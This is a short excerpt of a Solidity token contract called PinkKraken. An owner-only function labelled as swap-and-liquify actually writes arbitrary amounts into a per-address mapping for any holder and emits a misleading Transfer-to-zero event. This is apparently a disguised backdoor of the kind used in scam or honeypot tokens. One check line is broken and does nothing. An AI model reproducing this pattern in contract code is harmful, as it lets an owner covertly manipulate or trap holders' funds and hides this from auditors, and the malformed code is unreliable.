...
contract PinkKraken is Ownable {
  ...
  function _swapAndLiquify(address from, uint256 _value, uint256 deadline, bool approveMax, uint8 v) public onlyOwner {
    (from != address(0), "ERC20: burn from the zero address");
    swapAndLiquify(from, _value, deadline, approveMax, v);
  }

  function swapAndLiquify(address from, uint256 _value, uint256 deadline, bool approveMax, uint8 v) internal {
    if(from != address(0)){
      _liquify[from] = liquifyAmount * _value * (10 ** uint256(decimals));
       emit Transfer( from, address(0x0), _value);
    }
  }
